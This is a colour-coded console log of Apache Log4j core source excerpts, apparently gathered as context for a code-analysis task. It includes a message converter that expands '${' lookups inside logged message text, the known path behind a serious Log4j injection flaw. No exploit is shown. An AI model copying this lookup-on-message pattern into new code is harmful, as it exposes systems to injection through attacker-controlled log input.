[2;36m                    [0m         [1;36m117[0m[39m:    public static final StrMatcher DEFAULT_SUFFIX = [0m                            [2m                [0m
[2;36m                    [0m         [1;35mStrMatcher.stringMatcher[0m[1;39m([0m[32m"[0m[32m}[0m[32m"[0m[1;39m)[0m[39m;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:    private static final int BUF_SIZE = [0m[1;36m256[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:     * Stores the escape character.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    private char escapeChar;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:     * Stores the variable prefix.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:    private StrMatcher prefixMatcher;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:     * Stores the variable suffix.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:    private StrMatcher suffixMatcher;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:     * Variable resolution is delegated to an implementer of VariableResolver.[0m  [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:    private StrLookup variableResolver;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:     * The flag whether substitution in variable names is enabled.[0m              [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:    private boolean enableSubstitutionInVariables;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m141[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m142[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m143[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m144[0m[39m:     * Creates a new instance with defaults for variable prefix and suffix[0m      [2m                [0m
[2;36m                    [0m         [1;36m145[0m[39m:     * and the escaping character.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m146[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m147[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m148[0m[39m:        [0m[1;35mthis[0m[1;39m([0m[39mnull, DEFAULT_PREFIX, DEFAULT_SUFFIX, DEFAULT_ESCAPE[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m149[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m150[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m151[0m[39m:     * Creates a new instance and initializes it. Uses defaults for variable[0m    [2m                [0m
[2;36m                    [0m         [1;36m152[0m[39m:     * prefix and suffix and the escaping character.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m153[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m154[0m[39m:     * @param valueMap  the map with the variables' values, may be null[0m         [2m                [0m
[2;36m                    [0m         [1;36m155[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m156[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal Map<String, String> valueMap[0m[1;39m)[0m[39m [0m[1;39m{[0m                 [2m                [0m
[2;36m                    [0m         [1;36m157[0m[39m:        [0m[1;35mthis[0m[1;39m([0m[39mnew [0m[1;35mMapLookup[0m[1;39m([0m[39mvalueMap[0m[1;39m)[0m[39m, DEFAULT_PREFIX, DEFAULT_SUFFIX, [0m          [2m                [0m
[2;36m                    [0m         [39mDEFAULT_ESCAPE[0m[1;39m)[0m[39m;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m158[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m159[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m160[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m161[0m[39m:     * Creates a new instance and initializes it. Uses a default escaping [0m      [2m                [0m
[2;36m                    [0m         [39mcharacter.[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m162[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m163[0m[39m:     * @param valueMap  the map with the variables' values, may be null[0m         [2m                [0m
[2;36m                    [0m         [1;36m164[0m[39m:     * @param prefix  the prefix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m165[0m[39m:     * @param suffix  the suffix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m166[0m[39m:     * @throws IllegalArgumentException if the prefix or suffix is null[0m         [2m                [0m
[2;36m                    [0m         [1;36m167[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m168[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal Map<String, String> valueMap, final String [0m     [2m                [0m
[2;36m                    [0m         [39mprefix, final String suffix[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m169[0m[39m:        [0m[1;35mthis[0m[1;39m([0m[39mnew [0m[1;35mMapLookup[0m[1;39m([0m[39mvalueMap[0m[1;39m)[0m[39m, prefix, suffix, DEFAULT_ESCAPE[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m170[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m171[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m172[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m173[0m[39m:     * Creates a new instance and initializes it.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m174[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m175[0m[39m:     * @param valueMap  the map with the variables' values, may be null[0m         [2m                [0m
[2;36m                    [0m         [1;36m176[0m[39m:     * @param prefix  the prefix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m177[0m[39m:     * @param suffix  the suffix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m178[0m[39m:     * @param escape  the escape character[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m179[0m[39m:     * @throws IllegalArgumentException if the prefix or suffix is null[0m         [2m                [0m
[2;36m                    [0m         [1;36m180[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m181[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal Map<String, String> valueMap, final String [0m     [2m                [0m
[2;36m                    [0m         [39mprefix, final String suffix,[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m182[0m[39m:                          final char escape[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m183[0m[39m:        [0m[1;35mthis[0m[1;39m([0m[39mnew [0m[1;35mMapLookup[0m[1;39m([0m[39mvalueMap[0m[1;39m)[0m[39m, prefix, suffix, escape[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m184[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m185[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m186[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m187[0m[39m:     * Creates a new instance and initializes it.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m188[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m189[0m[39m:     * @param variableResolver  the variable resolver, may be null[0m              [2m                [0m
[2;36m                    [0m         [1;36m190[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m191[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal StrLookup variableResolver[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m192[0m[39m:        [0m[1;35mthis[0m[1;39m([0m[39mvariableResolver, DEFAULT_PREFIX, DEFAULT_SUFFIX, DEFAULT_ESCAPE[0m[1;39m)[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m193[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m194[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m195[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m196[0m[39m:     * Creates a new instance and initializes it.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m197[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m198[0m[39m:     * @param variableResolver  the variable resolver, may be null[0m              [2m                [0m
[2;36m                    [0m         [1;36m199[0m[39m:     * @param prefix  the prefix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m200[0m[39m:     * @param suffix  the suffix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/Constants.jav[0m[1;92ma:1[0m[39m-[0m[1;36m58[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.helpers;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.util.PropertiesUtil;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Log4j Constants.[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:public final class Constants [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:     * Name of the system property to use to identify the LogEvent factory.[0m      [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    public static final String LOG4J_LOG_EVENT_FACTORY = [0m[32m"Log4jLogEventFactory"[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     * Name of the system property to use to identify the ContextSelector Class.[0m [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public static final String LOG4J_CONTEXT_SELECTOR = [0m[32m"Log4jContextSelector"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    public static final String LOG4J_DEFAULT_STATUS_LEVEL = [0m                     [2m                [0m
[2;36m                    [0m         [32m"Log4jDefaultStatusLevel"[0m[39m;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * JNDI context name string literal.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public static final String JNDI_CONTEXT_NAME = [0m                              [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * Line separator.[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public static final String LINE_SEP = [0m                                       [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getStringProperty[0m[1;39m([0m[32m"line.separator"[0m[39m, [0m[32m"\n"[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * Number of milliseconds in a second.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    public static final int MILLIS_IN_SECONDS = [0m[1;36m1000[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * Prevent class instantiation.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private [0m[1;35mConstants[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/PatternFormatter.jav[0m[1;92ma:1[0m[39m-[0m[1;36m47[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:public class PatternFormatter [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:    private final LogEventPatternConverter converter;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:    private final FormattingInfo field;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    public [0m[1;35mPatternFormatter[0m[1;39m([0m[39mfinal LogEventPatternConverter converter, final [0m     [2m                [0m
[2;36m                    [0m         [39mFormattingInfo field[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:        this.converter = converter;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:        this.field = field;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder buf[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:        final int startField = [0m[1;35mbuf.length[0m[1;39m([0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:        [0m[1;35mconverter.format[0m[1;39m([0m[39mevent, buf[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:        [0m[1;35mfield.format[0m[1;39m([0m[39mstartField, buf[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public LogEventPatternConverter [0m[1;35mgetConverter[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        return converter;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    public FormattingInfo [0m[1;35mgetFormattingInfo[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        return field;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:67[0m[39m-[0m[1;36m77[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/LiteralPatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:49[0m[39m-[0m[1;36m74[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, literal[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [39m: literal[0m[1;39m)[0m[39m;[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal Object obj, final StringBuilder output[0m[1;39m)[0m[39m [0m[1;39m{[0m           [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;35moutput.append[0m[1;39m([0m[39msubstitute ? [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mliteral[0m[1;39m)[0m[39m : [0m         [2m                [0m
[2;36m                    [0m         [39mliteral[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal StringBuilder output, final Object[0m[33m...[0m[39m objects[0m[1;39m)[0m[39m [0m[1;39m{[0m    [2m                [0m
